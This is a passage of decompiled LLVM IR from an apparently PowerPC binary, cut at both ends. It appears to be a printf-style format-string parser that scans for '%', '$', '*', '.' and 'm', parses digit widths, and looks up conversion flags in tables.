  br i1 %v2_100064c0, label %dec_label_pc_100064b8, label %dec_label_pc_100064b4

dec_label_pc_100064b4:                            ; preds = %dec_label_pc_100064b0
  %v1_100064b4 = add i32 %v2_100064d4, -48
  store i32 %v1_100064b4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100064b8

dec_label_pc_100064b8:                            ; preds = %dec_label_pc_100064b0, %dec_label_pc_100064b4
  %v0_100064c015 = phi i32 [ %v0_10006508, %dec_label_pc_100064b0 ], [ %v1_100064b4, %dec_label_pc_100064b4 ]
  %v1_100064b8 = add i32 %v0_10006538, 1
  store i32 %v1_100064b8, i32* @r30, align 4
  br label %dec_label_pc_100064bc

dec_label_pc_100064bc:                            ; preds = %dec_label_pc_100064a4, %dec_label_pc_100064b8
  %v0_10006508 = phi i32 [ 0, %dec_label_pc_100064a4 ], [ %v0_100064c015, %dec_label_pc_100064b8 ]
  %v0_10006538 = phi i32 [ %v0_100064bc.pre, %dec_label_pc_100064a4 ], [ %v1_100064b8, %dec_label_pc_100064b8 ]
  %v1_100064bc = inttoptr i32 %v0_10006538 to i8*
  %v2_100064bc = load i8, i8* %v1_100064bc, align 1
  %v3_100064bc = zext i8 %v2_100064bc to i32
  store i32 %v3_100064bc, i32* %r11.global-to-local, align 4
  %v1_100064c4 = mul nuw nsw i32 %v3_100064bc, 2
  store i32 %v1_100064c4, i32* %r9.global-to-local, align 4
  %v2_100064c8 = add i32 %v1_100064c4, %v3_100064a4
  %v3_100064c8 = inttoptr i32 %v2_100064c8 to i16*
  %v4_100064c8 = load i16, i16* %v3_100064c8, align 2
  %v5_100064c8 = zext i16 %v4_100064c8 to i32
  store i32 %v5_100064c8, i32* %r0.global-to-local, align 4
  %v1_100064cc = mul i32 %v0_10006508, 10
  %v1_100064d0 = and i32 %v5_100064c8, 8
  store i32 %v1_100064d0, i32* @r25, align 4
  %v3_100064d0 = icmp eq i32 %v1_100064d0, 0
  %v2_100064d4 = add i32 %v3_100064bc, %v1_100064cc
  store i32 %v2_100064d4, i32* %r9.global-to-local, align 4
  br i1 %v3_100064d0, label %dec_label_pc_100064dc, label %dec_label_pc_100064b0

dec_label_pc_100064dc:                            ; preds = %dec_label_pc_100064bc
  %v0_100064dc = load i32, i32* %r10.global-to-local, align 4
  %v1_100064dc = add i32 %v0_100064dc, -1
  %v2_100064dc = inttoptr i32 %v1_100064dc to i8*
  %v3_100064dc = load i8, i8* %v2_100064dc, align 1
  %v4_100064dc = zext i8 %v3_100064dc to i32
  store i32 %v4_100064dc, i32* %r0.global-to-local, align 4
  %v3_100064e0 = icmp eq i8 %v3_100064dc, 37
  br i1 %v3_100064e0, label %dec_label_pc_100064e8, label %dec_label_pc_100065b0

dec_label_pc_100064e8:                            ; preds = %dec_label_pc_100064dc
  %v3_100064e8 = icmp eq i8 %v2_100064bc, 36
  br i1 %v3_100064e8, label %dec_label_pc_100064f0, label %dec_label_pc_10006524

dec_label_pc_100064f0:                            ; preds = %dec_label_pc_100064e8
  %tmp58 = icmp slt i32 %v0_10006508, 1
  br i1 %tmp58, label %dec_label_pc_10006524, label %dec_label_pc_100064f8

dec_label_pc_100064f8:                            ; preds = %dec_label_pc_100064f0
  %v0_100064f8 = load i32, i32* @r26, align 4
  %v3_100064f8 = icmp eq i32 %v0_100064f8, 0
  %v1_100064fc = add i32 %v0_10006538, 1
  store i32 %v1_100064fc, i32* %r10.global-to-local, align 4
  br i1 %v3_100064f8, label %dec_label_pc_100068c0, label %dec_label_pc_10006504

dec_label_pc_10006504:                            ; preds = %dec_label_pc_100064f8
  %v3_10006504 = icmp sgt i32 %v0_10006508, %v0_100064f8
  br i1 %v3_10006504, label %dec_label_pc_10006510, label %dec_label_pc_1000651c

dec_label_pc_10006510:                            ; preds = %dec_label_pc_10006504
  store i32 %v0_10006508, i32* @r26, align 4
  br label %dec_label_pc_1000651c

dec_label_pc_10006518:                            ; preds = %dec_label_pc_10006540, %dec_label_pc_10006538
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000651c

dec_label_pc_1000651c:                            ; preds = %dec_label_pc_10006504, %dec_label_pc_10006510, %dec_label_pc_10006518
  %v0_1000651c = phi i32 [ %v0_100064dc, %dec_label_pc_10006518 ], [ %v1_100064fc, %dec_label_pc_10006510 ], [ %v1_100064fc, %dec_label_pc_10006504 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_10006518 ], [ %v0_10006508, %dec_label_pc_10006510 ], [ %v0_10006508, %dec_label_pc_10006504 ]
  br label %dec_label_pc_10006558

dec_label_pc_10006524:                            ; preds = %dec_label_pc_100064e8, %dec_label_pc_100064f0
  %v0_10006524 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_10006524, 1
  br i1 %tmp59, label %dec_label_pc_10006538, label %dec_label_pc_1000652c

dec_label_pc_1000652c:                            ; preds = %dec_label_pc_10006524
  %v3_1000652c = icmp eq i8 %v2_100064bc, 109
  br i1 %v3_1000652c, label %dec_label_pc_100065b0, label %dec_label_pc_100068c0

dec_label_pc_10006538:                            ; preds = %dec_label_pc_10006524
  %v3_10006538 = icmp ugt i32 %v0_10006538, %v0_100064dc
  br i1 %v3_10006538, label %dec_label_pc_10006540, label %dec_label_pc_10006518

dec_label_pc_10006540:                            ; preds = %dec_label_pc_10006538
  %v1_10006540 = inttoptr i32 %v0_100064dc to i8*
  %v2_10006540 = load i8, i8* %v1_10006540, align 1
  %v3_10006540 = zext i8 %v2_10006540 to i32
  store i32 %v3_10006540, i32* %r0.global-to-local, align 4
  store i32 %v0_100064dc, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000654c = icmp eq i8 %v2_10006540, 48
  br i1 %v3_1000654c, label %dec_label_pc_10006518, label %dec_label_pc_100065b4

dec_label_pc_10006558:                            ; preds = %dec_label_pc_10006574, %dec_label_pc_1000651c
  %v0_10006578 = phi i32 [ %v0_1000651c, %dec_label_pc_1000651c ], [ %v1_10006578, %dec_label_pc_10006574 ]
  store i32 %v0_10006578, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000e644.243 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_10006568 = inttoptr i32 %v0_10006578 to i8*
  br label %dec_label_pc_10006560

dec_label_pc_10006560:                            ; preds = %dec_label_pc_10006580, %dec_label_pc_10006558
  %v1_10006574 = phi i32 [ %v1_10006584, %dec_label_pc_10006580 ], [ 1, %dec_label_pc_10006558 ]
  %v0_10006560 = phi i32 [ %v1_10006564, %dec_label_pc_10006580 ], [ ptrtoint ([8 x i8]* @global_var_1000e644.243 to i32), %dec_label_pc_10006558 ]
  %v1_10006560 = inttoptr i32 %v0_10006560 to i8*
  %v2_10006560 = load i8, i8* %v1_10006560, align 1
  %v3_10006560 = zext i8 %v2_10006560 to i32
  store i32 %v3_10006560, i32* %r9.global-to-local, align 4
  %v1_10006564 = add i32 %v0_10006560, 1
  store i32 %v1_10006564, i32* %r11.global-to-local, align 4
  %v2_10006568 = load i8, i8* %v1_10006568, align 1
  %v3_10006568 = zext i8 %v2_10006568 to i32
  store i32 %v3_10006568, i32* %r0.global-to-local, align 4
  %v4_1000656c = icmp eq i8 %v2_10006568, %v2_10006560
  br i1 %v4_1000656c, label %dec_label_pc_10006574, label %dec_label_pc_10006580

dec_label_pc_10006574:                            ; preds = %dec_label_pc_10006560
  %v0_10006574 = load i32, i32* %r6.global-to-local, align 4
  %v2_10006574 = or i32 %v0_10006574, %v1_10006574
  store i32 %v2_10006574, i32* %r6.global-to-local, align 4
  %v1_10006578 = add i32 %v0_10006578, 1
  br label %dec_label_pc_10006558

dec_label_pc_10006580:                            ; preds = %dec_label_pc_10006560
  %v1_10006580 = inttoptr i32 %v1_10006564 to i8*
  %v2_10006580 = load i8, i8* %v1_10006580, align 1
  %v3_10006580 = zext i8 %v2_10006580 to i32
  store i32 %v3_10006580, i32* %r0.global-to-local, align 4
  %v1_10006584 = mul i32 %v1_10006574, 2
  store i32 %v1_10006584, i32* %r10.global-to-local, align 4
  %v3_10006588 = icmp eq i8 %v2_10006580, 0
  br i1 %v3_10006588, label %dec_label_pc_10006590, label %dec_label_pc_10006560

dec_label_pc_10006590:                            ; preds = %dec_label_pc_10006580
  %v1_10006590 = add i32 %v0_10006578, -1
  %v2_10006590 = inttoptr i32 %v1_10006590 to i8*
  %v3_10006590 = load i8, i8* %v2_10006590, align 1
  %v4_10006590 = zext i8 %v3_10006590 to i32
  store i32 %v4_10006590, i32* %r0.global-to-local, align 4
  %v0_10006594 = load i32, i32* %r6.global-to-local, align 4
  %v1_10006594 = and i32 %v0_10006594, 10
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_1000659c = icmp eq i8 %v3_10006590, 37
  %v1_100065a0 = udiv i32 %v1_10006594, 2
  store i32 %v1_100065a0, i32* %r9.global-to-local, align 4
  %v2_100065a4 = sub nuw nsw i32 -1, %v1_100065a0
  %v3_100065a4 = and i32 %v0_10006594, %v2_100065a4
  store i32 %v3_100065a4, i32* %r6.global-to-local, align 4
  br i1 %v3_1000659c, label %dec_label_pc_100065b4, label %dec_label_pc_10006480

dec_label_pc_100065b0:                            ; preds = %dec_label_pc_100064dc, %dec_label_pc_1000652c
  store i32 %v0_100064dc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100065b4

dec_label_pc_100065b4:                            ; preds = %dec_label_pc_10006540, %dec_label_pc_10006590, %dec_label_pc_100065b0
  %v0_100065e8 = phi i32 [ 0, %dec_label_pc_10006590 ], [ %v0_10006508, %dec_label_pc_10006540 ], [ %v0_10006508, %dec_label_pc_100065b0 ]
  %v1_100065f4 = phi i32 [ %v0_10006578, %dec_label_pc_10006590 ], [ %v0_10006538, %dec_label_pc_10006540 ], [ %v0_10006538, %dec_label_pc_100065b0 ]
  %v0_100065f0 = phi i32 [ %v1_10006564, %dec_label_pc_10006590 ], [ %v0_100064dc, %dec_label_pc_10006540 ], [ %v0_100064dc, %dec_label_pc_100065b0 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_10006590 ], [ %stack_var_-84.1, %dec_label_pc_10006540 ], [ %stack_var_-84.1, %dec_label_pc_100065b0 ]
  %v1_100065b4 = inttoptr i32 %v0_100065f0 to i8*
  %v2_100065b4 = load i8, i8* %v1_100065b4, align 1
  %v3_100065b4 = zext i8 %v2_100065b4 to i32
  store i32 %v3_100065b4, i32* %r0.global-to-local, align 4
  %v3_100065b8 = icmp eq i8 %v2_100065b4, 42
  br i1 %v3_100065b8, label %dec_label_pc_100065c0, label %dec_label_pc_10006600

dec_label_pc_100065c0:                            ; preds = %dec_label_pc_100065b4
  %v0_100065c0 = load i32, i32* @r26, align 4
  %v3_100065c0 = icmp eq i32 %v0_100065c0, 0
  br i1 %v3_100065c0, label %dec_label_pc_100065f0, label %dec_label_pc_100065c8

dec_label_pc_100065c8:                            ; preds = %dec_label_pc_100065c0
  %v1_100065c8 = inttoptr i32 %v1_100065f4 to i8*
  %v2_100065c8 = load i8, i8* %v1_100065c8, align 1
  %v3_100065c8 = zext i8 %v2_100065c8 to i32
  store i32 %v3_100065c8, i32* %r0.global-to-local, align 4
  %v3_100065cc = icmp eq i8 %v2_100065c8, 36
  br i1 %v3_100065cc, label %dec_label_pc_100065d4, label %dec_label_pc_100068c0

dec_label_pc_100065d4:                            ; preds = %dec_label_pc_100065c8
  %tmp60 = icmp slt i32 %v0_100065e8, 1
  br i1 %tmp60, label %dec_label_pc_100068c0, label %dec_label_pc_100065dc

dec_label_pc_100065dc:                            ; preds = %dec_label_pc_100065d4
  %v0_100065dc = load i32, i32* %r5.global-to-local, align 4
  %v1_100065dc = mul i32 %v0_100065dc, -4
  %v1_100065e0 = add i32 %v1_100065f4, 1
  store i32 %v1_100065e0, i32* @r30, align 4
  %v0_100065e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_100065e4 = add i32 %v0_100065e4, %v1_100065dc
  store i32 %v2_100065e4, i32* %r9.global-to-local, align 4
  %v2_100065e8 = add i32 %v2_100065e4, 12
  %v3_100065e8 = inttoptr i32 %v2_100065e8 to i32*
  store i32 %v0_100065e8, i32* %v3_100065e8, align 4
  %v0_10006608.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100065fc

dec_label_pc_100065f0:                            ; preds = %dec_label_pc_100065c0
  %v1_100065f0 = add i32 %v0_100065f0, 1
  store i32 %v1_100065f0, i32* %r0.global-to-local, align 4
  %v4_100065f4 = icmp eq i32 %v1_100065f0, %v1_100065f4
  br i1 %v4_100065f4, label %dec_label_pc_100065fc, label %dec_label_pc_100068c0

dec_label_pc_100065fc:                            ; preds = %dec_label_pc_100065f0, %dec_label_pc_100065dc
  %v0_10006608.pre = phi i32 [ %v1_100065f4, %dec_label_pc_100065f0 ], [ %v0_10006608.pre.pre, %dec_label_pc_100065dc ]
  store i32 -2147483648, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10006600

dec_label_pc_10006600:                            ; preds = %dec_label_pc_100065b4, %dec_label_pc_100065fc
  %v0_10006608 = phi i32 [ %v1_100065f4, %dec_label_pc_100065b4 ], [ %v0_10006608.pre, %dec_label_pc_100065fc ]
  %v0_10006618 = phi i32 [ %v0_100065e8, %dec_label_pc_100065b4 ], [ -2147483648, %dec_label_pc_100065fc ]
  %v0_10006600 = load i32, i32* %r5.global-to-local, align 4
  %v3_10006600 = icmp eq i32 %v0_10006600, 0
  %v1_10006608 = inttoptr i32 %v0_10006608 to i8*
  br i1 %v3_10006600, label %dec_label_pc_10006608, label %dec_label_pc_1000662c

dec_label_pc_10006608:                            ; preds = %dec_label_pc_10006600
  %v2_10006608 = load i8, i8* %v1_10006608, align 1
  %v3_10006608 = zext i8 %v2_10006608 to i32
  store i32 %v3_10006608, i32* %r0.global-to-local, align 4
  %v3_1000660c = icmp eq i8 %v2_10006608, 46
  br i1 %v3_1000660c, label %dec_label_pc_10006614, label %dec_label_pc_10006624

dec_label_pc_10006614:                            ; preds = %dec_label_pc_10006608
  %v1_10006614 = add i32 %v0_10006608, 1
  store i32 %v0_10006618, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10006480

dec_label_pc_10006624:                            ; preds = %dec_label_pc_10006608
  store i32 %v0_10006618, i32* @r31, align 4
  br label %dec_label_pc_1000662c

dec_label_pc_1000662c:                            ; preds = %dec_label_pc_10006600, %dec_label_pc_10006624
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10006624 ], [ %v0_10006618, %dec_label_pc_10006600 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v2_10006630 = load i8, i8* %v1_10006608, align 1
  %v3_10006630 = zext i8 %v2_10006630 to i32
  store i32 %v3_10006630, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000e5ec.244 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006638

dec_label_pc_10006638:                            ; preds = %dec_label_pc_10006644, %dec_label_pc_1000662c
  %v0_10006644 = phi i32 [ %v1_10006644, %dec_label_pc_10006644 ], [ ptrtoint ([9 x i8]* @global_var_1000e5ec.244 to i32), %dec_label_pc_1000662c ]
  %v1_10006638 = inttoptr i32 %v0_10006644 to i8*
  %v2_10006638 = load i8, i8* %v1_10006638, align 1
  %v3_10006638 = zext i8 %v2_10006638 to i32
  store i32 %v3_10006638, i32* %r0.global-to-local, align 4
  %v4_1000663c = icmp eq i8 %v2_10006630, %v2_10006638
  br i1 %v4_1000663c, label %dec_label_pc_10006408, label %dec_label_pc_10006644

dec_label_pc_10006644:                            ; preds = %dec_label_pc_10006638
  %v1_10006644 = add i32 %v0_10006644, 1
  %v2_10006644 = inttoptr i32 %v1_10006644 to i8*
  %v3_10006644 = load i8, i8* %v2_10006644, align 1
  %v4_10006644 = zext i8 %v3_10006644 to i32
  store i32 %v4_10006644, i32* %r0.global-to-local, align 4
  store i32 %v1_10006644, i32* %r11.global-to-local, align 4
  %v3_10006648 = icmp eq i8 %v3_10006644, 0
  br i1 %v3_10006648, label %dec_label_pc_10006650, label %dec_label_pc_10006638

dec_label_pc_10006650:                            ; preds = %dec_label_pc_10006644, %dec_label_pc_10006408
  %v0_10006678 = phi i32 [ %v1_10006408, %dec_label_pc_10006408 ], [ %v0_10006608, %dec_label_pc_10006644 ]
  %v0_10006674 = phi i32 [ %v0_10006644, %dec_label_pc_10006408 ], [ %v1_10006644, %dec_label_pc_10006644 ]
  %v2_10006658 = sub i32 %v0_10006674, ptrtoint ([9 x i8]* @global_var_1000e5ec.244 to i32)
  store i32 %v2_10006658, i32* %r9.global-to-local, align 4
  %v2_1000665c = icmp sgt i32 %v2_10006658, 1
  br i1 %v2_1000665c, label %dec_label_pc_1000667c, label %dec_label_pc_10006664

dec_label_pc_10006664:                            ; preds = %dec_label_pc_10006650
  %v1_10006664 = inttoptr i32 %v0_10006678 to i8*
  %v2_10006664 = load i8, i8* %v1_10006664, align 1
  %v3_10006664 = zext i8 %v2_10006664 to i32
  store i32 %v3_10006664, i32* %r0.global-to-local, align 4
  %v1_10006668 = inttoptr i32 %v0_10006674 to i8*
  %v2_10006668 = load i8, i8* %v1_10006668, align 1
  %v3_10006668 = zext i8 %v2_10006668 to i32
  store i32 %v3_10006668, i32* %r9.global-to-local, align 4
  %v4_1000666c = icmp eq i8 %v2_10006664, %v2_10006668
  br i1 %v4_1000666c, label %dec_label_pc_10006674, label %dec_label_pc_1000667c

dec_label_pc_10006674:                            ; preds = %dec_label_pc_10006664
  %v1_10006674 = add i32 %v0_10006674, 9
  store i32 %v1_10006674, i32* %r11.global-to-local, align 4
  %v1_10006678 = add i32 %v0_10006678, 1
  store i32 %v1_10006678, i32* @r30, align 4
  br label %dec_label_pc_1000667c

dec_label_pc_1000667c:                            ; preds = %dec_label_pc_10006664, %dec_label_pc_10006650, %dec_label_pc_10006674
  %v0_10006680 = phi i32 [ %v0_10006674, %dec_label_pc_10006664 ], [ %v0_10006674, %dec_label_pc_10006650 ], [ %v1_10006674, %dec_label_pc_10006674 ]
  %v0_1000667c = phi i32 [ %v0_10006678, %dec_label_pc_10006664 ], [ %v0_10006678, %dec_label_pc_10006650 ], [ %v1_10006678, %dec_label_pc_10006674 ]
  %v1_1000667c = inttoptr i32 %v0_1000667c to i8*
  %v2_1000667c = load i8, i8* %v1_1000667c, align 1
  %v3_1000667c = zext i8 %v2_1000667c to i32
  store i32 %v3_1000667c, i32* %r7.global-to-local, align 4
  %v1_10006680 = add i32 %v0_10006680, 9
  %v2_10006680 = inttoptr i32 %v1_10006680 to i8*
  %v3_10006680 = load i8, i8* %v2_10006680, align 1
  %v4_10006680 = zext i8 %v3_10006680 to i32
  store i32 %v4_10006680, i32* %r0.global-to-local, align 4
  %v3_10006684 = icmp eq i8 %v2_1000667c, 0
  %v1_10006688 = mul nuw nsw i32 %v4_10006680, 256
  store i32 %v1_10006688, i32* %r10.global-to-local, align 4
  br i1 %v3_10006684, label %dec_label_pc_100068c0, label %dec_label_pc_10006690

dec_label_pc_10006690:                            ; preds = %dec_label_pc_1000667c
  %v1_10006694 = and i32 %v1_10006688, 1024
  store i32 %v1_10006694, i32* %r0.global-to-local, align 4
  %v3_10006694 = icmp eq i32 %v1_10006694, 0
  store i32 ptrtoint ([21 x i8]* @global_var_1000e62c.245 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r3.global-to-local, align 4
  %v3_100066a0 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_100066a0, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e620.246 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000e62c.245 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100066b0

dec_label_pc_100066b0:                            ; preds = %dec_label_pc_10006714, %dec_label_pc_10006690
  %v1_100066bc = phi i32 [ %v1_10006714, %dec_label_pc_10006714 ], [ ptrtoint ([21 x i8]* @global_var_1000e62c.245 to i32), %dec_label_pc_10006690 ]
  %v1_100066b0 = inttoptr i32 %v1_100066bc to i8*
  %v2_100066b0 = load i8, i8* %v1_100066b0, align 1
  %v3_100066b0 = zext i8 %v2_100066b0 to i32
  store i32 %v3_100066b0, i32* %r0.global-to-local, align 4
  %v4_100066b4 = icmp eq i8 %v2_100066b0, %v2_1000667c
  br i1 %v4_100066b4, label %dec_label_pc_100066bc, label %dec_label_pc_10006714

dec_label_pc_100066bc:                            ; preds = %dec_label_pc_100066b0
  %v2_100066bc = sub i32 %v1_100066bc, ptrtoint ([21 x i8]* @global_var_1000e62c.245 to i32)
  %tmp61 = icmp slt i32 %v2_100066bc, 18
  %brmerge = or i1 %v3_10006694, %tmp61
  br i1 %brmerge, label %dec_label_pc_100066d0, label %dec_label_pc_100066cc

dec_label_pc_100066cc:                            ; preds = %dec_label_pc_100066bc
  %v1_100066cc = add i32 %v2_100066bc, -2
  br label %dec_label_pc_100066d0

dec_label_pc_100066d0:                            ; preds = %dec_label_pc_100066bc, %dec_label_pc_100066cc
  %storemerge = phi i32 [ %v1_100066cc, %dec_label_pc_100066cc ], [ %v2_100066bc, %dec_label_pc_100066bc ]
  %v0_100066d0 = phi i32 [ %v1_100066cc, %dec_label_pc_100066cc ], [ %v2_100066bc, %dec_label_pc_100066bc ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100066d0 = load i32, i32* @r28, align 4
  %v2_100066d0 = add i32 %v1_100066d0, 32
  %v3_100066d0 = inttoptr i32 %v2_100066d0 to i32*
  store i32 %v0_100066d0, i32* %v3_100066d0, align 4
  store i32 ptrtoint (i32* @global_var_1000e61f.247 to i32), i32* %r11.global-to-local, align 4
  %v0_100066dc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100066d8

dec_label_pc_100066d8:                            ; preds = %dec_label_pc_100066d8, %dec_label_pc_100066d0
  %v0_100066d8 = phi i32 [ %v1_100066d8, %dec_label_pc_100066d8 ], [ ptrtoint (i32* @global_var_1000e61f.247 to i32), %dec_label_pc_100066d0 ]
  %v1_100066d8 = add i32 %v0_100066d8, 1
  %v2_100066d8 = inttoptr i32 %v1_100066d8 to i8*
  %v3_100066d8 = load i8, i8* %v2_100066d8, align 1
  %v4_100066d8 = zext i8 %v3_100066d8 to i32
  store i32 %v4_100066d8, i32* %r0.global-to-local, align 4
  store i32 %v1_100066d8, i32* %r11.global-to-local, align 4
  %v3_100066dc = icmp sgt i32 %v0_100066dc.pre, %v4_100066d8
  br i1 %v3_100066dc, label %dec_label_pc_100066d8, label %dec_label_pc_100066e4

dec_label_pc_100066e4:                            ; preds = %dec_label_pc_100066d8
  %v0_100066e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_100066e4 = sub i32 %v1_100066d8, %v0_100066e4
  %v1_100066ec = mul i32 %v2_100066e4, 2
  store i32 %v1_100066ec, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e610.248 to i32), i32* %r9.global-to-local, align 4
  %v2_100066f4 = add i32 %v1_100066ec, ptrtoint (i32* @global_var_1000e610.248 to i32)
  %v3_100066f4 = inttoptr i32 %v2_100066f4 to i16*
  %v4_100066f4 = load i16, i16* %v3_100066f4, align 2
  %v5_100066f4 = sext i16 %v4_100066f4 to i32
  store i32 %v5_100066f4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e600.249 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000e62c.245 to i32), i32* %r8.global-to-local, align 4
  %v2_10006704 = add i32 %v1_100066ec, ptrtoint (i32* @global_var_1000e600.249 to i32)
  %v3_10006704 = inttoptr i32 %v2_10006704 to i16*
  %v4_10006704 = load i16, i16* %v3_10006704, align 2
  %v5_10006704 = sext i16 %v4_10006704 to i32
  store i32 %v5_10006704, i32* %r9.global-to-local, align 4
  %v2_10006708 = or i32 %v5_100066f4, %v1_10006688
  store i32 %v2_10006708, i32* %r0.global-to-local, align 4
  %v2_1000670c = and i32 %v5_10006704, %v2_10006708
  store i32 %v2_1000670c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006720

dec_label_pc_10006714:                            ; preds = %dec_label_pc_100066b0
  %v1_10006714 = add i32 %v1_100066bc, 1
  %v2_10006714 = inttoptr i32 %v1_10006714 to i8*
  %v3_10006714 = load i8, i8* %v2_10006714, align 1
  %v4_10006714 = zext i8 %v3_10006714 to i32
  store i32 %v4_10006714, i32* %r0.global-to-local, align 4
  store i32 %v1_10006714, i32* %r8.global-to-local, align 4
  %v3_10006718 = icmp eq i8 %v3_10006714, 0
  br i1 %v3_10006718, label %dec_label_pc_10006720, label %dec_label_pc_100066b0

dec_label_pc_10006720:                            ; preds = %dec_label_pc_10006714, %dec_label_pc_100066e4
  %v0_10006720 = phi i32 [ %v2_1000670c, %dec_label_pc_100066e4 ], [ %v3_100066a0, %dec_label_pc_10006714 ]
  store i32 %v0_10006720, i32* %stack_var_-96, align 4
  %v0_10006724 = load i32, i32* %r6.global-to-local, align 4
  %v1_10006724 = call i32 @__asm_rlwinm(i32 %v0_10006724, i32 30, i32 31, i32 31)
  %not.v2_10006728 = icmp eq i32 %v1_10006724, 0
  %v6_1000672c = sext i1 %not.v2_10006728 to i32
  store i32 %v6_1000672c, i32* %r9.global-to-local, align 4
  %v1_10006730 = call i32 @__asm_rlwinm(i32 %v1_10006688, i32 0, i32 20, i32 23)
  store i32 %v1_10006730, i32* %r0.global-to-local, align 4
  %v1_10006734 = call i32 @__asm_rlwinm(i32 %v6_1000672c, i32 0, i32 0, i32 27)
  store i32 %v1_10006734, i32* %r9.global-to-local, align 4
  %v0_10006738 = load i32, i32* @r30, align 4
  %v1_10006738 = inttoptr i32 %v0_10006738 to i8*
  %v2_10006738 = load i8, i8* %v1_10006738, align 1
  %v3_10006738 = zext i8 %v2_10006738 to i32
  store i32 %v3_10006738, i32* %r10.global-to-local, align 4
  %v0_1000673c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000673c = call i32 @__asm_rlwinm(i32 %v0_1000673c, i32 0, i32 30, i32 28)
  %v1_10006740 = add i32 %v1_10006734, 48
  store i32 %v1_10006740, i32* %r9.global-to-local, align 4
  %v2_10006744 = or i32 %v1_1000673c, %v1_10006730
  store i32 %v2_10006744, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v0_1000674c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000674c = load i32, i32* @r28, align 4
  %v2_1000674c = add i32 %v1_1000674c, 12
  %v3_1000674c = inttoptr i32 %v2_1000674c to i32*
  store i32 %v0_1000674c, i32* %v3_1000674c, align 4
  %v0_10006750 = load i32, i32* %r4.global-to-local, align 4
  %v1_10006750 = load i32, i32* @r28, align 4
  %v2_10006750 = add i32 %v1_10006750, 4
  %v3_10006750 = inttoptr i32 %v2_10006750 to i32*
  store i32 %v0_10006750, i32* %v3_10006750, align 4
  %v0_10006754 = load i32, i32* @r31, align 4
  %v1_10006754 = load i32, i32* @r28, align 4
  %v2_10006754 = add i32 %v1_10006754, 8
  %v3_10006754 = inttoptr i32 %v2_10006754 to i32*
  store i32 %v0_10006754, i32* %v3_10006754, align 4
  %v0_10006758 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006758 = load i32, i32* @r28, align 4
  %v2_10006758 = add i32 %v1_10006758, 20
  %v3_10006758 = inttoptr i32 %v2_10006758 to i32*
  store i32 %v0_10006758, i32* %v3_10006758, align 4
  %v0_1000675c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000675c = load i32, i32* @r28, align 4
  %v2_1000675c = add i32 %v1_1000675c, 16
  %v3_1000675c = inttoptr i32 %v2_1000675c to i32*
  store i32 %v0_1000675c, i32* %v3_1000675c, align 4
  %v0_10006760 = load i32, i32* %r7.global-to-local, align 4
  %v1_10006760 = load i32, i32* @r28, align 4
  %v2_10006760 = add i32 %v1_10006760, 28
  %v3_10006760 = inttoptr i32 %v2_10006760 to i32*
  store i32 %v0_10006760, i32* %v3_10006760, align 4
  %v0_10006764 = load i32, i32* %r8.global-to-local, align 4
  %v1_10006764 = inttoptr i32 %v0_10006764 to i8*
  %v2_10006764 = load i8, i8* %v1_10006764, align 1
  %v3_10006764 = zext i8 %v2_10006764 to i32
  store i32 %v3_10006764, i32* %r9.global-to-local, align 4
  %v3_10006768 = icmp eq i8 %v2_10006764, 0
  br i1 %v3_10006768, label %dec_label_pc_10006770, label %dec_label_pc_10006788

dec_label_pc_10006770:                            ; preds = %dec_label_pc_10006720
  %v0_10006770 = load i32, i32* @r30, align 4
  %v1_10006770 = inttoptr i32 %v0_10006770 to i8*
  %v2_10006770 = load i8, i8* %v1_10006770, align 1
  %v3_10006770 = zext i8 %v2_10006770 to i32
  store i32 %v3_10006770, i32* %r0.global-to-local, align 4
  %v3_10006774 = icmp eq i8 %v2_10006770, 109
  br i1 %v3_10006774, label %dec_label_pc_1000677c, label %dec_label_pc_100068c0

dec_label_pc_1000677c:                            ; preds = %dec_label_pc_10006770
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10006780 = load i32, i32* @r28, align 4
  %v2_10006780 = add i32 %v1_10006780, 28
  %v3_10006780 = inttoptr i32 %v2_10006780 to i32*
  store i32 %v3_10006764, i32* %v3_10006780, align 4
  %v0_10006784 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006784 = load i32, i32* @r28, align 4
  %v2_10006784 = add i32 %v1_10006784, 32
  %v3_10006784 = inttoptr i32 %v2_10006784 to i32*
